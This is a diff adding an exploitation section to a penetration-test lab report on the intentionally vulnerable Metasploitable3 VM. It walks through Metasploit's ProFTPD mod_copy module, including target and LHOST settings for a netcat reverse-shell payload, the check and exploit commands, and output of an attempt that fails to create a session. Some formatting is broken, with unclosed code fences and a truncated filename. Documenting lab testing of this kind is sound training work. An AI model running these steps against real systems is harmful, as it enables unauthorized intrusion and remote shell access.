@@ -468,3 +468,459 @@ The `vagrant` account has unrestricted passwordless sudo permissions, allowing c
 ## Assessment Note
 
 All privilege-escalation testing documented in this report was performed against the intentionally vulnerable Metasploitable3 laboratory environment.
+
+## Exploitation and Initial Access
+
+### ProFTPD Module Discovery
+
+The previously identified FTP service was ProFTPD 1.3.5 running on TCP port 21. Metasploit was queried for modules associated with the identified ProFTPD service.
+
+#### Command Used
+
+```text
+search proftpd modcopy
+What It Does
+
+The search command queries the Metasploit module database for modules matching the supplied search terms. In this case, proftpd modcopy narrows the search toward modules associated with ProFTPD's mod_copy functionality.
+
+Why We're Running It
+
+The service enumeration phase identified ProFTPD 1.3.5 on the target. Module discovery is therefore being performed against a previously identified service rather than selecting an exploit arbitrarily.
+
+Assessment Significance
+
+This step connects the vulnerability/service-enumeration phase with the exploitation phase. The presence of a matching Metasploit module does not by itself prove that the target is exploitable; exploitation must still be validated against the authorized laboratory target.
+
+Evidence
+
+screenshots/metasploit-proftpd-module-search.png
+#### Evidence
+
+`screenshots/metasploit-proftpd-module-search.png`
+
+---
+
+### ProFTPD Exploit Module Configuration Review
+
+After identifying a matching ProFTPD module, the module was loaded without immediately executing it. The available module and payload options were reviewed first to understand the configuration requirements and to ensure that the exploitation attempt would be performed against the intended laboratory target.
+
+#### Command Used
+
+```text
+use exploit/unix/ftp/proftpd_modcopy_exec
+show options
+What It Does
+
+The use command selects the exploit/unix/ftp/proftpd_modcopy_exec module.
+
+The show options command displays the configuration parameters required by the module, optional parameters, payload settings, and the exploitation target.
+
+When the module was loaded, Metasploit automatically selected:
+
+cmd/unix/reverse_netcat
+
+as the default payload because no payload had been explicitly configured.
+
+Why We're Running It
+
+The earlier enumeration identified ProFTPD 1.3.5 on TCP port 21. The selected module specifically identifies ProFTPD 1.3.5 as its exploitation target.
+
+Reviewing the module configuration before execution allows the assessment to establish whether the module's requirements correspond to the services and network configuration already identified on the Metasploitable3 target.
+
+This also prevents the exploitation attempt from being performed with an incorrect target address, FTP port, HTTP port, or reverse-payload configuration.
+
+Module Options Identified
+Option	Current Setting	Purpose
+RHOSTS	Not configured	Specifies the remote target host
+RPORT_FTP	21	Specifies the ProFTPD FTP service
+RPORT	80	Specifies the HTTP service used by the module
+SITEPATH	/var/www	Specifies the expected writable website path
+TARGETURI	/	Specifies the base web path
+TMPPATH	/tmp	Specifies the temporary filesystem location
+LHOST	10.0.2.15	Local address for the reverse payload
+LPORT	4444	Local listening port for the reverse payload
+Exploit Target
+
+The module reported:
+
+Exploit target:
+
+0   ProFTPD 1.3.5
+
+This is significant because it corresponds directly with the ProFTPD version identified during the earlier service enumeration phase.
+
+The match provides a technically justified reason to investigate this module against the authorized Metasploitable3 laboratory target.
+
+However, identifying a matching module does not by itself prove that the target is exploitable. Successful exploitation must still be validated against the target.
+
+Payload Analysis
+
+The selected payload was:
+
+cmd/unix/reverse_netcat
+
+A reverse payload causes the target to initiate a connection back toward the assessment machine after successful exploitation.
+
+The LHOST value determines the local address that receives the connection, while LPORT determines the TCP port used for that connection.
+
+Because the displayed LHOST value was 10.0.2.15, its suitability for the current 192.168.56.0/24 laboratory network must be verified before execution.
+
+Assessment Significance
+
+The module review establishes a clear relationship between the previous reconnaissance findings and the exploitation phase:
+
+Service Enumeration
+        ↓
+ProFTPD 1.3.5 identified on TCP/21
+        ↓
+Metasploit module search
+        ↓
+ProFTPD mod_copy module identified
+        ↓
+Module configuration reviewed
+        ↓
+Network and payload configuration validated
+        ↓
+Exploitation validation
+
+This methodology ensures that exploitation is based on an identified service and version rather than an arbitrary module selection.
+
+#### Evidence
+
+The Metasploit module information and configuration review were captured in the following screenshots:
+
+- `screenshots/metasploit-proftpd-module-info1.png`
+- `screenshots/metasploit-proftpd-module-info2.png`
+- `screenshots/metasploit-proftpd-module-info3.png`
+- `screenshots/metasploit-proftpd-show-options1.png`
+- `screenshots/metasploit-proftpd-show-options2.png`
+---
+
+### Kali Network Interface Verification
+
+Before configuring the reverse payload, the network interfaces on the Kali assessment machine were examined to identify the local address that is reachable from the Metasploitable3 target.
+
+#### Command Used
+
+```text
+ip addr
+What It Does
+
+The ip addr command displays the network interfaces and their assigned IP addresses on the local Kali system.
+
+This information is important when configuring a reverse payload because the target must be able to establish a connection back to the correct interface on the assessment machine.
+
+Relevant Interface
+
+The assessment machine has multiple network interfaces. The interface used for communication with the Metasploitable3 laboratory network was identified as:
+
+eth1
+inet 192.168.56.103/24
+
+The Metasploitable3 target is:
+
+192.168.56.101
+
+Both systems therefore reside on the 192.168.56.0/24 laboratory network.
+
+The Kali system also has an eth0 address of 10.0.2.15. Although this address is valid on the Kali system, it belongs to a different network and is not the appropriate address for the reverse connection in this laboratory configuration.
+
+Assessment Significance
+
+The interface verification established that 192.168.56.103 is the appropriate local address for the reverse payload.
+
+The network relationship is:
+
+Kali
+192.168.56.103
+     |
+     | 192.168.56.0/24
+     |
+Metasploitable3
+192.168.56.101
+
+Therefore, the reverse payload should use:
+
+LHOST = 192.168.56.103
+Evidence
+screenshots/metasploit-kali-network-interface1.png
+screenshots/metasploit-kali-network-interface2.png
+Reverse Payload LHOST Configuration
+
+After identifying the correct Kali interface, the Metasploit module was configured to use the reachable laboratory network address for the reverse payload.
+
+Command Used
+set LHOST 192.168.56.103
+What It Does
+
+The set LHOST command changes the local host address used by the configured reverse payload.
+
+In this assessment, LHOST was changed from the automatically displayed 10.0.2.15 address to 192.168.56.103, which is the Kali interface connected to the same laboratory network as the Metasploitable3 target.
+
+Why We're Running It
+
+A reverse payload must connect back to an address reachable from the target. Using the correct laboratory interface ensures that the payload is configured for the intended assessment network rather than an unrelated interface.
+
+Verification
+
+The module configuration was reviewed after changing LHOST:
+
+show options
+
+The expected configuration should display:
+
+LHOST    192.168.56.103
+LPORT    4444
+Assessment Significance
+
+Changing LHOST does not itself establish successful exploitation. It only prepares the reverse payload to communicate with the assessment machine if the exploitation attempt succeeds.
+
+The configuration was therefore verified before proceeding to the exploitation stage.
+
+Evidence
+
+screenshots/metasploit-proftpd-lhost-configured1.png
+screenshots/metasploit-proftpd-lhost-configured2.
+---
+
+### ProFTPD Module Information Review
+
+Before attempting exploitation, the selected Metasploit module was reviewed using the `info` command. This provided additional technical information about the module and its intended exploitation target.
+
+#### Command Used
+
+```text
+info
+What It Does
+
+The info command displays detailed information about the currently selected Metasploit module. This can include the module description, affected software, references, disclosure information, available targets, payload information, and module-specific technical details.
+
+Why We're Running It
+
+The module was selected because the earlier service enumeration identified ProFTPD 1.3.5 on the target. Reviewing the module information provides additional context before execution and helps confirm that the selected module is appropriate for the identified service.
+
+This is also an important validation step because finding a module through search does not automatically establish that the target is exploitable.
+
+Assessment Significance
+
+The module information provides additional technical context for the proposed exploitation path and supports the assessment methodology of validating the selected module before execution.
+
+The exploitation decision is therefore based on the previously identified ProFTPD service and version rather than an arbitrary module selection.
+
+Evidence
+screenshots/metasploit-proftpd-module-info1.png
+screenshots/metasploit-proftpd-module-info2.png
+screenshots/metasploit-proftpd-module-info3.png
+Pre-Exploitation Configuration Review
+
+At this stage, the assessment has established the following:
+
+Item	Verified Value
+Target	192.168.56.101
+FTP service	ProFTPD
+FTP port	21
+Target version	ProFTPD 1.3.5
+HTTP port	80
+Kali laboratory interface	192.168.56.103
+LHOST	192.168.56.103
+LPORT	4444
+Metasploit module	exploit/unix/ftp/proftpd_modcopy_exec
+Module target	ProFTPD 1.3.5
+
+The configuration has been reviewed before execution, and the target and local laboratory network have been explicitly identified.
+---
+---
+
+### Pre-Exploitation Configuration Validation
+
+A final configuration review was performed before attempting exploitation. The initial review showed that the required `RHOSTS` value had not yet been configured and that the reverse payload was still displaying the default `LHOST` value of `10.0.2.15`.
+
+Because the target is located on the `192.168.56.0/24` laboratory network and the Kali assessment interface on that network is `192.168.56.103`, the module configuration was corrected before proceeding.
+
+#### Commands Used
+
+```text
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.103
+show options
+Configuration Requirements
+Parameter	Required Configuration	Purpose
+RHOSTS	192.168.56.101	Authorized Metasploitable3 target
+RPORT	80	Target HTTP service
+RPORT_FTP	21	Target ProFTPD FTP service
+SITEPATH	/var/www	Website filesystem path used by the module
+TARGETURI	/	Base HTTP path
+TMPPATH	/tmp	Temporary target filesystem path
+LHOST	192.168.56.103	Kali address reachable from the target
+LPORT	4444	Reverse payload listening port
+Why We're Running It
+
+The final configuration check prevents an exploitation attempt from being directed at the wrong host or configured with an unreachable reverse-payload address.
+
+This is particularly important because the module initially displayed 10.0.2.15 as LHOST, while the authorized Metasploitable3 target communicates with Kali over the 192.168.56.0/24 laboratory network.
+
+Assessment Significance
+
+The final configuration must identify both sides of the assessment connection correctly:
+
+Kali
+192.168.56.103
+       |
+       | 192.168.56.0/24
+       |
+Metasploitable3
+192.168.56.101
+
+Only after RHOSTS and LHOST have been explicitly configured and verified should the assessment proceed to exploitation validation.
+
+Evidence
+
+screenshots/metasploit-proftpd-pre-exploit-options1.png
+screenshots/metasploit-proftpd-pre-exploit-options2.png
+---
+
+### Pre-Exploitation Vulnerability Check
+
+Before executing the exploitation module, a non-destructive vulnerability check was performed against the authorized Metasploitable3 target.
+
+#### Command Used
+
+```text
+check
+
+RHOSTS and LHOST configured
+        ↓
+Vulnerability check performed
+        ↓
+Target appears vulnerable
+        ↓
+Unauthenticated SITE CPFR confirmed
+
+At this point, the target has passed the module's vulnerability check and the exploitation attempt can be considered as the next phase of the authorized laboratory assessment.
+
+The vulnerability check itself did not establish root privileges or successful command execution. Those outcomes must be validated separately after exploitation.
+
+Evidence
+
+screenshots/metasploit-proftpd-check.png
+---
+
+### ProFTPD Exploitation Attempt
+
+After the target passed the Metasploit vulnerability check, an exploitation attempt was performed against the authorized Metasploitable3 laboratory target.
+
+#### Command Used
+
+```text
+exploit
+What It Does
+
+The exploit command instructs Metasploit to execute the selected proftpd_modcopy_exec module using the configured target, module options, and reverse payload.
+
+The module was configured to target the Metasploitable3 host at 192.168.56.101 and use the Kali laboratory interface at 192.168.56.103 for the reverse connection.
+
+Exploitation Output
+[*] Started reverse TCP handler on 192.168.56.103:4444
+[*] 192.168.56.101:80 - 192.168.56.101:21 - Connected to FTP server
+[*] 192.168.56.101:80 - 192.168.56.101:21 - Sending copy commands to FTP server
+[-] 192.168.56.101:80 - Exploit aborted due to failure: unknown: 192.168.56.101:21 - Failure copying PHP payload to website path, directory not writable?
+[*] Exploit completed, but no session was created.
+What Happened
+
+The exploitation attempt successfully started the reverse TCP handler on the Kali assessment machine and connected to the target's FTP service.
+
+The module then attempted to send its file-copy commands to the ProFTPD service. However, the PHP payload could not be copied to the configured website path.
+
+Metasploit reported:
+
+Failure copying PHP payload to website path, directory not writable?
+
+The module subsequently reported:
+
+Exploit completed, but no session was created.
+Finding
+
+The exploitation attempt did not result in a session.
+
+This distinction is important because the previous check command reported that the target appeared vulnerable and confirmed successful use of the unauthenticated SITE CPFR command. However, the actual exploitation attempt could not complete the payload deployment stage.
+
+The evidence therefore supports the following sequence:
+
+ProFTPD 1.3.5 identified
+        ↓
+Matching Metasploit module selected
+        ↓
+Target configuration verified
+        ↓
+Vulnerability check passed
+        ↓
+Unauthenticated SITE CPFR confirmed
+        ↓
+Exploitation attempted
+        ↓
+PHP payload copy failed
+        ↓
+No session created
+Security Interpretation
+
+The vulnerability check demonstrates that the target exposes functionality associated with the selected ProFTPD exploitation technique. However, this assessment did not demonstrate successful remote code execution through the proftpd_modcopy_exec module.
+
+The failure was reported at the payload-copy stage, with Metasploit indicating that the configured website path may not have been writable.
+
+Therefore, the report does not classify this particular exploitation attempt as successful compromise.
+
+Assessment Significance
+
+This result demonstrates why vulnerability identification and exploitation validation are separate stages of a penetration test.
+
+A system may exhibit behavior that causes a vulnerability check to report a positive result while the complete exploitation chain fails because of environmental conditions, filesystem permissions, configuration, payload deployment, or other prerequisites.
+
+In this case, the vulnerability check succeeded, but the exploitation attempt did not produce a session.
+
+Evidence
+
+screenshots/metasploit-proftpd-exploit-failed.png
+---
+
+### Session Validation
+
+After the exploitation attempt completed, the Metasploit session table was checked to determine whether an active command or shell session had been established.
+
+#### Command Used
+
+```text
+sessions
+What It Does
+
+The sessions command displays active sessions established by Metasploit modules.
+
+Why We're Running It
+
+The exploitation output reported that no session was created. Checking the session table provides direct evidence that the exploitation attempt did not establish an interactive session on the target.
+
+Finding
+
+No active Metasploit sessions were present.
+
+This confirms that the proftpd_modcopy_exec exploitation attempt did not establish an interactive session on the Metasploitable3 target.
+
+The assessment therefore records the following results:
+
+Assessment Stage	Result
+ProFTPD version identification	Confirmed
+Matching Metasploit module	Identified
+Module configuration	Verified
+Vulnerability check	Passed
+Exploitation attempt	Performed
+Payload deployment	Failed
+Metasploit session	Not established
+Root compromise through this exploit	Not demonstrated
+Assessment Significance
+
+The vulnerability check and the exploitation attempt produced different outcomes. The check indicated that the target appeared vulnerable and that the unauthenticated SITE CPFR operation was successful. However, the subsequent exploitation attempt failed during payload deployment and did not create a session.
+
+Therefore, this evidence should not be presented as a successful remote-code-execution compromise. It demonstrates vulnerability exposure and a failed exploitation attempt within the authorized laboratory environment.
+
+Evidence
+
+screenshots/metasploit-proftpd-sessions.png
